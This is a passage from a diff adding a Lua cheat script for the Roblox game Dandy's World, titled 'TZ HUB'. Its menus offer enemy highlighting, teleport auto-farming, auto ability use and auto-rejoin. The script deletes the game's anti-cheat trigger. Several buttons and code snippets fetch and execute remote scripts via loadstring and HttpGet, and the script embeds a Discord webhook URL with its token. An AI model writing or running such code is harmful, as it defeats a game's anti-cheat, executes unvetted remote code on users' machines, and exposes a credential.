+                        if not enemy or not enemy.Parent then
+                            if hl then
+                                hl:Destroy()
+                            end
+                            highlights[enemy] = nil
+                        end
+                    end
+
+                    task.wait(0.3)
+                end
+
+                -- cleanup when toggle off
+                for enemy, hl in pairs(highlights) do
+                    if hl then
+                        hl:Destroy()
+                    end
+                end
+                highlights = {}
+            end)
+        end
+    end
+})
+
+
+--// Custom Highlight Section
+local CustomHighlightSection = VisualTab:Section({
+    Title = "Custom Highlight",
+    Box = false,
+    TextTransparency = 0.05,
+    TextXAlignment = "Left",
+    TextSize = 17,
+    Opened = true,
+})
+
+-- Input: Name of Object
+local objectName = ""
+CustomHighlightSection:Input({
+    Title = "Name of Object",
+    Placeholder = "e.g. HumanoidRootPart",
+    Callback = function(value)
+        objectName = value
+    end
+})
+
+-- Input: Object Path (optional)
+local objectPath = ""
+CustomHighlightSection:Input({
+    Title = "Object Path (optional)",
+    Placeholder = "e.g. Workspace.Part",
+    Callback = function(value)
+        objectPath = value
+    end
+})
+
+-- Toggle: Highlight Object
+CustomHighlightSection:Toggle({
+    Title = "Highlight Object",
+    Flag = "custom_highlight_toggle",
+    Value = false,
+    Callback = function(state)
+        if state then
+            local target
+            -- If path provided, try to find object by path
+            if objectPath ~= "" then
+                local success, result = pcall(function()
+                    return loadstring("return " .. objectPath)()
+                end)
+                if success and result then
+                    target = result
+                end
+            end
+            -- If no path, try to find by name in Workspace
+            if not target and objectName ~= "" then
+                target = workspace:FindFirstChild(objectName, true)
+            end
+
+            if target then
+                if not target:FindFirstChild("CustomHighlight") then
+                    local highlight = Instance.new("Highlight")
+                    highlight.Name = "CustomHighlight"
+                    highlight.FillColor = Color3.fromRGB(255, 215, 0) -- gold default
+                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                    highlight.Parent = target
+                end
+            else
+                WindUI:Notify({
+                    Title = "Highlight Error",
+                    Content = "Object not found: " .. (objectPath ~= "" and objectPath or objectName),
+                    Icon = "solar:info-circle-bold",
+                    Duration = 4,
+                })
+            end
+        else
+            -- Remove highlight when toggle is off
+            local target
+            if objectPath ~= "" then
+                local success, result = pcall(function()
+                    return loadstring("return " .. objectPath)()
+                end)
+                if success and result then
+                    target = result
+                end
+            end
+            if not target and objectName ~= "" then
+                target = workspace:FindFirstChild(objectName, true)
+            end
+            if target and target:FindFirstChild("CustomHighlight") then
+                target.CustomHighlight:Destroy()
+            end
+        end
+    end
+})
+-- Paste this after your WindUI Window has been created (Window variable must exist)
+
+assert(Window, "WindUI Window not found. Run this after creating your Window.")
+
+-- Create Universal tab
+local UniversalTab = Window:Tab({
+    Title = "Universal",
+    Icon = "globe"
+})
+
+-- Section with credit
+UniversalTab:Section({
+    Title = "Float script by @muapx_0",
+    Desc = "Shared in the Discord bookclub"
+})
+
+UniversalTab:Button({
+    Title = "Run Float Script",
+    Desc = "Loads float script",
+    Callback = function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://gist.githubusercontent.com/shigaraki-svg/6a037ac5d9a6386ccfc9871c18b757af/raw/05715144621af9d2249c8b6a883f12872eeebcbc/Float"))()
+        end)
+
+        if success then
+            print("[Universal] Float script executed!")
+        else
+            warn("[Universal] Error:", err)
+        end
+    end
+})
+--// Feedback Tab
+local FeedbackTab = Window:Tab({
+    Title = "Feedback",
+    Icon = "mail-check",
+    Locked = false,
+})
+FeedbackTab:Select()
+
+FeedbackTab:Section({
+    Title = "Send Feedback",
+    Desc = "Submit feedback directly to Discord webhook",
+    Icon = "solar:edit-bold",
+    IconColor = Color3.fromRGB(255, 0, 0),
+})
+
+local feedbackText = ""
+local lastSent = 0
+local player = game.Players.LocalPlayer
+local anonymousMode = false -- toggle state
+
+--// Toggle (Anonymous)
+FeedbackTab:Toggle({
+    Title = "Hide Username",
+    Desc = "Send feedback anonymously",
+    Icon = "solar:user-block-bold",
+    Value = false,
+    Callback = function(state)
+        anonymousMode = state
+    end
+})
+
+--// Input
+FeedbackTab:Input({
+    Title = "Your Feedback",
+    Placeholder = "Type your feedback here...",
+    Icon = "solar:pen-bold",
+    IconColor = Color3.fromRGB(255, 0, 0),
+    Callback = function(value)
+        feedbackText = value
+    end,
+})
+
+--// Button
+FeedbackTab:Button({
+    Title = "Send Feedback",
+    Color = Color3.fromRGB(200, 0, 0),
+    Icon = "solar:send-bold",
+    IconColor = Color3.fromRGB(255, 255, 255),
+    Callback = function()
+        local now = tick()
+
+        -- Cooldown check
+        if now - lastSent < 10 then
+            WindUI:Notify({
+                Title = "Cooldown",
+                Content = "Please wait 10 seconds before sending again.",
+                Icon = "alert-triangle",
+                Duration = 3,
+                Color = Color3.fromRGB(255, 0, 0),
+            })
+            return
+        end
+
+        -- Empty check
+        if feedbackText == "" then
+            WindUI:Notify({
+                Title = "Feedback",
+                Content = "Please enter some text before sending.",
+                Icon = "alert-triangle",
+                Duration = 3,
+                Color = Color3.fromRGB(255, 0, 0),
+            })
+            return
+        end
+
+        -- Block mass mentions
+        local lowerText = feedbackText:lower()
+        if string.find(lowerText, "@everyone") or string.find(lowerText, "@here") then
+            WindUI:Notify({
+                Title = "Feedback Error",
+                Content = "Mass mentions (@everyone / @here) are not allowed.",
+                Icon = "alert-triangle",
+                Duration = 4,
+                Color = Color3.fromRGB(255, 0, 0),
+            })
+            return
+        end
+
+        -- Decide username
+        local username = anonymousMode and "**Anonymous**" or player.Name
+
+        -- Prepare webhook payload
+        local HttpService = game:GetService("HttpService")
+        local webhookURL = "https://discord.com/api/webhooks/1467864734257909991/g_6k7MEaAe6YWHkjgAIBOBYaqBQBxNeEGwN2B8Qc4Jdh6eeGyX02nazIPsdGkGs2Qnep"
+        local payload = HttpService:JSONEncode({
+            content = "**Feedback Submitted**\n"
+                .. "Username: " .. username .. "\n"
+                .. "Message: \"" .. feedbackText .. "\""
+        })
+
+        -- Detect available HTTP request function
+        local requestFunction = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+        if not requestFunction then
+            WindUI:Notify({
+                Title = "Feedback Error",
+                Content = "Your executor does not support HTTP requests.",
+                Icon = "alert-triangle",
+                Duration = 4,
+                Color = Color3.fromRGB(255, 0, 0),
+            })
+            return
+        end
+
+        -- Send request safely
+        local success, err = pcall(function()
+            requestFunction({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+        end)
+
+        if success then
+            WindUI:Notify({
+                Title = "Feedback",
+                Content = "Feedback sent successfully!",
+                Icon = "check",
+                Duration = 3,
+                Color = Color3.fromRGB(0, 200, 0),
+            })
+            feedbackText = ""
+            lastSent = tick()
+        else
+            WindUI:Notify({
+                Title = "Feedback Error",
+                Content = tostring(err),
+                Icon = "alert-triangle",
+                Duration = 4,
+                Color = Color3.fromRGB(255, 0, 0),
+            })
+        end
+    end,
+})
+local SettingsTab = Window:Tab({
+    Title = "Settings",
+    Icon = "solar:folder-with-files-bold",
+    IconColor = Color3.fromRGB(255, 180, 0),
+    Border = true,
+})
+
+local ConfigManager = Window.ConfigManager
+local ConfigName = "default"
+local myConfig = ConfigManager:CreateConfig(ConfigName)
+
+local ConfigNameInput = SettingsTab:Input({
+    Title = "Config Name",
+    Icon = "file-cog",
+    Callback = function(value)
+        ConfigName = value
+        myConfig = ConfigManager:CreateConfig(ConfigName)
+    end,
+})
+
+local function refreshDropdown(dd)
+    dd:Refresh(ConfigManager:AllConfigs())
+end
+
+local AllConfigsDropdown = SettingsTab:Dropdown({
+    Title = "All Configs",
+    Values = ConfigManager:AllConfigs(),
+    Value = ConfigName,
+    Callback = function(value)
+        ConfigName = value
+        ConfigNameInput:Set(value)
+        myConfig = ConfigManager:CreateConfig(ConfigName)
+    end,
+})
+
+SettingsTab:Button({
+    Title = "Save Config",
+    Callback = function()
+        if myConfig:Save() then
+            WindUI:Notify({
+                Title = "Settings",
+                Content = "Saved '"..ConfigName.."'",
+                Icon = "check"
+            })
+        end
+        refreshDropdown(AllConfigsDropdown)
+    end,
+})
+
+SettingsTab:Button({
+    Title = "Load Config",
+    Callback = function()
+        if myConfig:Load() then
+            WindUI:Notify({
+                Title = "Settings",
+                Content = "Loaded '"..ConfigName.."'",
+                Icon = "refresh-cw"
+            })
+        else
+            WindUI:Notify({
+                Title = "Settings",
+                Content = "Failed to load '"..ConfigName.."'",
+                Icon = "alert-triangle"
+            })
+        end
+    end,
+})
+
+SettingsTab:Button({
+    Title = "Delete Config",
+    Color = Color3.fromRGB(255, 80, 80),
+    Callback = function()
+        if myConfig:Delete() then
+            WindUI:Notify({
+                Title = "Settings",
+                Content = "Deleted '"..ConfigName.."'",
+                Icon = "trash"
+            })
+        end
+        refreshDropdown(AllConfigsDropdown)
+    end,
+})
+--// Community Tab
+local CommunityTab = Window:Tab({
+    Title = "Community",
+    Icon = "solar:users-group-rounded-bold",
+})
+
+
+--// Discord Paragraph
+local DiscordParagraph = CommunityTab:Paragraph({
+    Title = "My Discord",
+    Desc = "Join our community and stay connected!\n\nInvite: https://discord.gg/NKUefuSfqb",
+    Color = "Red", -- can be "Red", "Orange", "Green", "Blue", "White", "Grey"
+    Image = "solar:megaphone-bold", -- optional icon
+    ImageSize = 30,
+    Thumbnail = "", -- optional thumbnail (rbxassetid://...)
+    ThumbnailSize = 80,
+    Locked = false,
+    Buttons = {
+        {
+            Icon = "link",
+            Title = "Copy Invite",
+            Callback = function()
+                if setclipboard then
+                    setclipboard("https://discord.gg/NKUefuSfqb")
+                    WindUI:Notify({
+                        Title = "Community",
+                        Content = "Discord invite copied to clipboard!",
+                        Icon = "solar:clipboard-bold",
+                        Duration = 4,
+                    })
+                else
+                    WindUI:Notify({
+                        Title = "Community",
+                        Content = "Clipboard not supported.\nInvite: https://discord.gg/NKUefuSfqb",
+                        Icon = "solar:info-square-bold",
+                        Duration = 6,
+                    })
+                end
+            end,
+        }
+    }
+})
+local Code = CommunityTab:Code({
+    Title = "Twilight Zone Script",
+    Code = [[loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/91c7c1c16fc59ceceb9ae82b6aaccecd0738a69c0daa3f16d9ebfcdb18f4a0f0/download"))()]]
+})
+local Code = CommunityTab:Code({
+    Title = "Auto load config",
+    Code = [[getgenv().autoload = true
+getgenv().configname = "Your config name here"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/b5eb099f0def0effa08b6c11e288ba4b51144709e12dc8ee14c440117030499a/download"))()]]
+})
+local ownerImage = "rbxassetid://134431081616391"
+
+local Paragraph = CommunityTab:Paragraph({
+    Title = "Tz Hub Owner",
+    Desc = "Ali_hhjjj-Owner",
+    Color = "Red",
+    Image = ownerImage,
+    ImageSize = 100,       -- make it smaller
+    Thumbnail = ownerImage,
+    ThumbnailSize = 120,  -- make the bigger thumbnail smaller too
+    Locked = false,
+    Buttons = {
+        {
+            Icon = "sparkles",
+            Title = "Owner Profile",
+            Callback = function()
+                setclipboard("https://www.roblox.com/users/9183531534/profile")
+            end,
+        }
+    }
+})
+--// Live Theme Editor in Settings Tab
+local currentTheme = {
+    Name = "Live Theme",
+    Accent = Color3.fromRGB(200, 50, 50),
+    Background = Color3.fromRGB(20, 20, 20),
+    Outline = Color3.fromRGB(255, 255, 255),
+    Text = Color3.fromRGB(255, 255, 255),
+    Placeholder = Color3.fromRGB(120, 120, 120),
+    Button = Color3.fromRGB(50, 50, 50),
+    Icon = Color3.fromRGB(160, 160, 160),
+}
+
+--// Section inside Settings Tab
+local ThemeSection = SettingsTab:Section({
+    Title = "Your Theme!",
+    Box = false,
+    TextTransparency = 0.05,
+    TextXAlignment = "Left",
+    TextSize = 17, -- optional
+    Opened = true,
+})
+
+-- Accent Colorpicker
+ThemeSection:Colorpicker({
+    Title = "Accent Color",
+    Desc = "Pick accent color for highlights",
+    Default = currentTheme.Accent,
+    Callback = function(color)
+        currentTheme.Accent = color
+        WindUI:AddTheme(currentTheme)
+        WindUI:SetTheme("Live Theme")
+    end
+})
+
+-- Background Colorpicker
+ThemeSection:Colorpicker({
+    Title = "Background Color",
+    Desc = "Pick background color",
+    Default = currentTheme.Background,
+    Callback = function(color)
+        currentTheme.Background = color
+        WindUI:AddTheme(currentTheme)
+        WindUI:SetTheme("Live Theme")
+    end
+})
+
+-- Text Colorpicker
+ThemeSection:Colorpicker({
+    Title = "Text Color",
+    Desc = "Pick text color",
+    Default = currentTheme.Text,
+    Callback = function(color)
+        currentTheme.Text = color
+        WindUI:AddTheme(currentTheme)
+        WindUI:SetTheme("Live Theme")
+    end
+})
+
+-- Reset Theme Button
+ThemeSection:Button({
+    Title = "Reset Theme",
+    Desc = "Revert back to the default theme",
+    Icon = "solar:refresh-bold",
+    Callback = function()
+        WindUI:SetTheme("Crimson") -- change "Crimson" if your default is different
+        WindUI:Notify({
+            Title = "Theme Reset",
+            Content = "Theme has been reset to default (Crimson).",
+            Icon = "solar:palette-bold",
+            Duration = 4,
+        })
+    end
+})
+
+-- Auto Use Ability
+getgenv().AutoUseAbility = getgenv().AutoUseAbility or false
+
+local abilityThread = nil
+
+local function useAbility()
+    local args = {
+        [1] = "UseAbility",
+        [2] = 1,
+        [3] = {}
+    }
+
+    pcall(function()
+        game:GetService("ReplicatedStorage").Remotes.AbilityFunction:InvokeServer(unpack(args))
+    end)
+end
+
+local function getCooldown()
+    local gui = game:GetService("Players").LocalPlayer
+        .PlayerGui:FindFirstChild("GameUI")
+
+    if not gui then return 1 end
+
+    local cd = gui.HUD.BottomRight.AbilityButton:FindFirstChild("CooldownTime")
+    if not cd then return 1 end
+
+    local num = tonumber(cd.Text)
+    return num or 1
+end
+
+local function runAbilityLoop()
+    while getgenv().AutoUseAbility do
+        local cd = getCooldown()
+
+        if cd == 0 then
+            useAbility()
+        end
+
+        task.wait(1)
+    end
+    abilityThread = nil
+end
+
+MainTab:Toggle({
+    Title = "Auto Use Ability",
+    Desc = "",
+    Flag = "auto_use_ability",
+    Value = getgenv().AutoUseAbility,
+    Callback = function(state)
+        getgenv().AutoUseAbility = state
+
+        if state and not abilityThread then
+            abilityThread = task.spawn(runAbilityLoop)
+        end
+    end,
+})
+
+--// Services
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+local function getChar()
+    return lp.Character or lp.CharacterAdded:Wait()
+end
+
+local function getHRP()
+    local char = getChar()
+    return char:WaitForChild("HumanoidRootPart")
+end
+
+--// Globals
+getgenv().TaskLock = getgenv().TaskLock or false
+
+local AutoStuffing = false
+local StuffingThread
+
+--// Helpers
+local function getPart(obj)
+    if obj:IsA("BasePart") then
+        return obj
+    elseif obj:IsA("Model") then
+        return obj:FindFirstChildWhichIsA("BasePart")
+    end
+end
+
+local function getPrompt(obj)
+    return obj:FindFirstChildWhichIsA("ProximityPrompt", true)
+end
+
+-- 🔥 Enemy check (Bug 2 fix)
+local function IsEnemyNearby(range)
+    local char = getChar()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return false end
+
+    for _, v in pairs(workspace:GetDescendants()) do
+        if v:IsA("Model") and v:FindFirstChild("HumanoidRootPart") then
+            local name = v.Name:lower()
+
+            -- adjust names if needed
+            if name:find("hifly") or name:find("enemy") or name:find("monster") then
+                local dist = (v.HumanoidRootPart.Position - hrp.Position).Magnitude
+                if dist < range then
+                    return true
+                end
+            end
+        end
+    end
+
+    return false
+end
+
+-- 🔒 Task system (Bug 1 fix)
+local function DoTask(func)
+    if getgenv().TaskLock then return end
+    getgenv().TaskLock = true
+    pcall(func)
+    getgenv().TaskLock = false
+end
+
+--// Main
+local function startAutoStuffing()
+    if StuffingThread then return end
+
+    StuffingThread = task.spawn(function()
+        while AutoStuffing do
+            local pickup = workspace:FindFirstChild("Pickup")
+            local folder = pickup and pickup:FindFirstChild("Stuffing")
+
+            if not folder then
+                task.wait(0.15)
+                continue
+            end
+
+            for _, item in ipairs(folder:GetChildren()) do
+                if not AutoStuffing then break end
+
+                -- 🔒 prevents conflict with coils/machines
+                if getgenv().TaskLock then
+                    task.wait(0.1)
+                    continue
+                end
+
+                -- 🧠 safety check before teleport
+                if IsEnemyNearby(25) then
+                    task.wait(0.2)
+                    continue
+                end
+
+                DoTask(function()
+                    local char = getChar()
+                    local hrp = getHRP()
+
+                    local part = getPart(item)
+                    local prompt = part and getPrompt(item)
+
+                    if part and prompt and part.Parent then
+                        local savedCF = hrp.CFrame
+                        local attempts = 0
+
+                        while AutoStuffing and part.Parent and attempts < 6 do
+                            attempts += 1
+
+                            -- safer teleport
+                            hrp.CFrame = part.CFrame * CFrame.new(0, -2.5, 0)
+                            task.wait(0.03)
+
+                            hrp.CFrame = part.CFrame
+                            fireproximityprompt(prompt)
+                            task.wait(0.05)
+                        end
+
+                        -- return safely
+                        hrp.CFrame = savedCF
+                        task.wait(0.05)
+                    end
+                end)
+            end
+
+            task.wait(0.1)
+        end
+
+        StuffingThread = nil
+    end)
+end
+
+--==================================================
+-- Toggle
+--==================================================
+MainTab:Toggle({
+    Title = "Auto Collect Stuffing",
+    Desc = "",
+    Value = false,
+    Callback = function(state)
+        AutoStuffing = state
+        if state then
+            startAutoStuffing()
+        end
+    end
+})
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+
+local DOLLYS_PLACE_ID = 99146394215857
+
+local autoRejoinEnabled = false
+local connections = {}
+local isTeleporting = false
+
+local function hasLobby()
+    local map = workspace:FindFirstChild("Map")
+    if not map then return false end
+    local persistent = map:FindFirstChild("Persistent")
+    if not persistent then return false end
+    return persistent:FindFirstChild("Lobby") ~= nil
+end
+
+local function checkAndTeleport()
+    if isTeleporting then return end
+    if hasLobby() then return end
+    local count = #Players:GetPlayers()
+    if count >= 2 then
+        isTeleporting = true
+        local player = Players.LocalPlayer
+        if player then
+            pcall(function()
+                TeleportService:Teleport(DOLLYS_PLACE_ID, player)
+            end)
+        end
+        task.delay(5, function()
+            isTeleporting = false
+        end)
+    end
+end
+
+local function startAutoRejoin()
+    if autoRejoinEnabled then return end
+    autoRejoinEnabled = true
+    connections.PlayerAdded = Players.PlayerAdded:Connect(function()
+        task.wait(0.1)
+        checkAndTeleport()
+    end)
+    connections.PlayerRemoving = Players.PlayerRemoving:Connect(function()
+        task.wait(0.1)
+        checkAndTeleport()
+    end)
+    -- initial check
+    task.spawn(function() task.wait(0.2); checkAndTeleport() end)
+end
+
+local function stopAutoRejoin()
+    autoRejoinEnabled = false
+    for k, v in pairs(connections) do
+        if v and v.Disconnect then
+            v:Disconnect()
+        end
+        connections[k] = nil
+    end
+    isTeleporting = false
+end
+
+local AutoRejoinToggle = MainTab:Toggle({
+    Title = "Auto Rejoin on player",
+    Desc = "Teleport you to Dolly's Factory lobby if there's another player in the server meaning this feature only for solo runs",
+    Color = Color3.fromHex("#ffb86b"),
+    Justify = "Center",
+    IconAlign = "Left",
+    Icon = "",
+    Default = false,
+    Callback = function(state)
+        if state then
+            startAutoRejoin()
+        else
+            stopAutoRejoin()
+        end
+    end
+})
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+assert(MainTab, "MainTab not found. Run this after creating PlayerTab.")
+
+local AUTO_ENABLED = false
+local connections = {}
+local isTeleporting = false
+local TARGET_INDEX = 2
+
+local function getLobbyExists()
+    local map = workspace:FindFirstChild("Map")
+    if not map then return false end
+    local persistent = map:FindFirstChild("Persistent")
+    if not persistent then return false end
+    return persistent:FindFirstChild("Lobby") ~= nil
+end
+
+local function getTargetModel()
+    local map = workspace:FindFirstChild("Map")
+    if not map then return nil end
+    local lobbyTrain = map:FindFirstChild("LobbyTrain")
+    if not lobbyTrain then return nil end
+    local children = lobbyTrain:GetChildren()
+    if not children or #children < TARGET_INDEX then return nil end
+    local entry = children[TARGET_INDEX]
+    if not entry then return nil end
+    local model = entry:FindFirstChild("Model") or entry:FindFirstChildWhichIsA("Model")
+    if model and model:IsA("Model") then
+        return model
+    end
+    return nil
+end
+
+local function teleportToModel(model)
+    if not model then return false, "No model" end
+    local player = Players.LocalPlayer
+    if not player then return false, "No player" end
+    local char = player.Character or player.CharacterAdded:Wait()
+    if not char then return false, "No character" end
+    local primary = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
+    if not primary then return false, "Target model has no primary part" end
+    local charPrimary = char.PrimaryPart or char:FindFirstChildWhichIsA("BasePart")
+    if not charPrimary then return false, "Character has no primary part" end
+    local ok, err = pcall(function()
+        charPrimary.CFrame = primary.CFrame + Vector3.new(0, 3, 0)
+    end)
+    if not ok then return false, err end
+    return true
+end
+
+local function checkAndTeleportToLobbyTrain()
+    if isTeleporting then return end
+    if not getLobbyExists() then return end
+    local count = #Players:GetPlayers()
+    if count >= 2 then
+        local model = getTargetModel()
+        if not model then return end
+        isTeleporting = true
+        task.spawn(function()
+            local ok, err = teleportToModel(model)
+            if not ok then
+                warn("Auto join solo run teleport failed:", err)
+            end
+            task.wait(1)
+            isTeleporting = false
+        end)
+    end
+end
+
+local function startAutoJoinSoloRun()
+    if AUTO_ENABLED then return end
+    AUTO_ENABLED = true
+    connections.PlayerAdded = Players.PlayerAdded:Connect(function()
+        task.wait(0.1)
+        checkAndTeleportToLobbyTrain()
+    end)
+    connections.PlayerRemoving = Players.PlayerRemoving:Connect(function()
+        task.wait(0.1)
+        checkAndTeleportToLobbyTrain()
+    end)
+    task.spawn(function() task.wait(0.2); checkAndTeleportToLobbyTrain() end)
+end
+
+local function stopAutoJoinSoloRun()
+    AUTO_ENABLED = false
+    for k, v in pairs(connections) do
+        if v and v.Disconnect then v:Disconnect() end
+        connections[k] = nil
+    end
+    isTeleporting = false
+end
+
+MainTab:Toggle({
+    Title = "Auto join solo run",
+    Desc = "",
+    Color = Color3.fromHex("#ffb86b"),
+    Justify = "Center",
+    IconAlign = "Left",
+    Icon = "",
+    Default = false,
+    Callback = function(state)
+        if state then
+            startAutoJoinSoloRun()
+        else
+            stopAutoJoinSoloRun()
+        end
+    end
+})
+-- Reject notify toggle (updated: per-reject notifications with "Reject" removed)
+-- Place this in Maintab (or your desired tab). Uses WindUI:Notify if available.
+
+local notify = function(title, content, duration)
+    if WindUI and WindUI.Notify then
+        pcall(function()
+            WindUI:Notify({
+                Title = title or "Notification",
+                Content = content or "",
+                Duration = duration or 6,
+            })
+        end)
+    else
+        print(("[RejectNotify] %s: %s"):format(title or "Notification", content or ""))
+    end
+end
+
+local function getEnemyNames()
+    local ok, folder = pcall(function() return workspace:FindFirstChild("Enemies") end)
+    if not ok or not folder then return {} end
+    local children = folder:GetChildren()
+    local names = {}
+    for _, v in ipairs(children) do
+        if v and v.Name then
+            table.insert(names, tostring(v.Name))
+        end
+    end
+    return names
+end
+
+-- clean name by removing the word "Reject" (case-insensitive) and trimming whitespace
+local function cleanName(name)
+    if not name then return "" end
+    local cleaned = name:gsub("[Rr]eject", "") -- remove "Reject" or "reject"
+    cleaned = cleaned:gsub("^%s+", ""):gsub("%s+$", "") -- trim
+    if cleaned == "" then
+        return name -- fallback to original if nothing left
+    end
+    return cleaned
+end
+
+local rejectNotifyEnabled = false
+local rejectNotifyThread = nil
+
+local function runRejectNotify()
+    -- Wait for initial state where enemies appear; only notify each batch once until cleared
+    local notifiedBatch = false
+
+    while rejectNotifyEnabled do
+        local names = getEnemyNames()
+
+        if #names > 0 and not notifiedBatch then
+            -- Send one notification per enemy with Title "Notification" and cleaned content
+            for _, rawName in ipairs(names) do
+                if not rejectNotifyEnabled then break end
+                local content = cleanName(rawName)
+                notify("Notification", content, 6)
+                task.wait(0.12) -- small spacing between notifications to avoid spamming too fast
+            end
+            notifiedBatch = true
+        end
+
+        if #names == 0 and notifiedBatch then
+            -- All rejects cleared → notify once that zone changed/cleared
+            notify("Notification", "Zone cleared — new zone may have appeared", 6)
+            notifiedBatch = false
+        end
+
+        task.wait(0.8)
+    end
+
+    rejectNotifyThread = nil
+end
+
+local function startRejectNotify()
+    if rejectNotifyEnabled then return end
+    rejectNotifyEnabled = true
+    if rejectNotifyThread then return end
+    rejectNotifyThread = task.spawn(runRejectNotify)
+end
+
+local function stopRejectNotify()
+    rejectNotifyEnabled = false
+    rejectNotifyThread = nil
+end
+
+-- UI toggle in Maintab
+MainTab:Toggle({
+    Title = "Reject notify",
+    Desc = "",
+    Flag = "reject_notify_toggle",
+    Value = false,
+    Callback = function(state)
+        if state then
+            startRejectNotify()
+        else
+            stopRejectNotify()
+        end
+    end,
+})
+-- CREATE NEW TAB: CHANGELOGS
+
+-- Create the tab
+local ChangelogsTab = Window:Tab({
+    Title = "Changelogs",
+    Icon = "scroll-text", -- optional icon
+    Locked = false,
+})
+
+-- Add a paragraph to the tab
+local ChangelogsParagraph = ChangelogsTab:Paragraph({
+    Title = "Changelogs",
+    Desc = "Improved teleport to machine auto farm function/nfixed auto train parts function in the auto farm/nfixed auto use ability crash the server and break the auto farm/nhopefully fixed auto keplie/nadd missions blacklist in MainTab/nfixed auto farm auto coil",
+    Color = "Blue", -- you can change to Red, Green, etc.
+    Image = "", -- optional image
+    ImageSize = 30,
+    Thumbnail = "", -- optional thumbnail
+    ThumbnailSize = 80,
+    Locked = false,
+    Buttons = {} -- no buttons by default
+})
+
+-- Example usage to set/update description later
+-- ChangelogsParagraph:SetDesc("Your updated changelog description here")
+WindUI:Notify({
+    Title = "Announcement",
+    Content = "COOL UPDATE!!!!",
+    Icon = "solar:megaphone-bold",
+    Duration = 6, -- seconds the notify stays visible
+})
+
+end,
+    [16116270224] = function()
+        print("Loaded for Game 1")        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Check if the object exists before deleting
+local antiCheatTrigger = ReplicatedStorage:FindFirstChild("Events") and ReplicatedStorage.Events:FindFirstChild("AntiCheatTrigger")
+
+if antiCheatTrigger then
+    antiCheatTrigger:Destroy()
+    print("AntiCheatTrigger deleted successfully.")
+else
+    warn("AntiCheatTrigger not found.")
+end
+local RunService = game:GetService("RunService")
+
+local cloneref = (cloneref or clonereference or function(instance) return instance end)
+local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
+
+local WindUI
+
+do
+    local ok, result = pcall(function()
+        return require("./src/Init")
+    end)
+
+    if ok then
+        WindUI = result
+    else
+        if cloneref(game:GetService("RunService")):IsStudio() then
+            WindUI = require(cloneref(ReplicatedStorage:WaitForChild("WindUI"):WaitForChild("Init")))
+        else
+            WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
+        end
+    end
+end
+
+-- */  Colors  /* --
+local Purple = Color3.fromHex("#7775F2")
+local Yellow = Color3.fromHex("#ECA201")
+local Green  = Color3.fromHex("#10C550")
+local Grey   = Color3.fromHex("#83889E")
+local Blue   = Color3.fromHex("#257AF7")
+local Red    = Color3.fromHex("#EF4F1D")
+local Cyan   = Color3.fromHex("#00E5FF")
+
+-- */  Window  /* --
+local Window = WindUI:CreateWindow({
+    Title  = "TZ HUB  ||  Dandy's World",
+    Author = "By Ali_hhjjj",
+    Folder = "tzhub",
+    Icon   = "solar:skull-bold-duotone",
+    NewElements = true,
+    HideSearchBar = false,
+
+    OpenButton = {
+        Title         = "Open TZ HUB",
+        CornerRadius  = UDim.new(1, 0),
+        StrokeThickness = 3,
+        Enabled       = true,
+        Draggable     = true,
+        OnlyMobile    = false,
+        Scale         = 1,
+        Color         = ColorSequence.new(
+            Color3.fromHex("#00E5FF"),
+            Color3.fromHex("#7775F2")
+        ),
+    },
+
+    Topbar = {
+        Height      = 44,
+        ButtonsType = "Mac",
+    },
+})
+
+Window:Tag({
+    Title = "v" .. WindUI.Version,
+    Icon  = "github",
+    Color = Color3.fromHex("#1c1c1c"),
+    Border = true,
+})
+
+-- */  Main Tab  /* --
+local MainTab = Window:Tab({
+    Title     = "Main",
+    Icon      = "solar:home-2-bold",
+    IconColor = Cyan,
+    IconShape = "Square",
+})
+
+--auto farm and ecounter
+do
+    local autoFarmEnabled = false
+    local encounterTwistedEnabled = false
+    local farmThread
+    local freezeConn
+    local collectThread
+    local promptThread
+    local chaseWatchThread
+
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local VIM = game:GetService("VirtualInputManager")
+    local lp = Players.LocalPlayer
+    local MY_NAME = lp.Name
+
+    local isHiding = false
+
+    local function getRoot()
+        local char = lp.Character
+        return char and char:FindFirstChild("HumanoidRootPart")
+    end
+
+    local function getHumanoid()
+        local char = lp.Character
+        return char and char:FindFirstChildOfClass("Humanoid")
+    end
+
+    local function teleportTo(targetPos)
+        local root = getRoot()
+        if not root then return end
+        local hum = getHumanoid()
+        if hum then hum.WalkSpeed = 0 end
+        root.CFrame = CFrame.new(targetPos)
+        task.wait(0.05)
+        if hum then hum.WalkSpeed = 16 end
+    end
+
+    local currentFreezePos = nil
+
+    local function startFreeze(pos)
+        currentFreezePos = pos
+        if freezeConn then freezeConn:Disconnect() end
+        freezeConn = RunService.Heartbeat:Connect(function()
+            if not currentFreezePos then return end
+            local root = getRoot()
+            if root then
+                root.CFrame = CFrame.new(currentFreezePos)
+                root.AssemblyLinearVelocity = Vector3.zero
+                root.AssemblyAngularVelocity = Vector3.zero
+            end
+        end)
+    end
+
+    local function stopFreeze()
+        currentFreezePos = nil
+        if freezeConn then
+            freezeConn:Disconnect()
+            freezeConn = nil
+        end
+    end
+
+    -- Fire number keys using VIM for 5 seconds then stop
+    local function fireNumbersFor5Seconds()
+        if collectThread then task.cancel(collectThread) end
+        collectThread = task.spawn(function()
+            local t = 0
+            while autoFarmEnabled and t < 5 do
+                VIM:SendKeyEvent(true, Enum.KeyCode.One, false, game)
+                VIM:SendKeyEvent(false, Enum.KeyCode.One, false, game)
+                VIM:SendKeyEvent(true, Enum.KeyCode.Two, false, game)
+                VIM:SendKeyEvent(false, Enum.KeyCode.Two, false, game)
+                VIM:SendKeyEvent(true, Enum.KeyCode.Three, false, game)
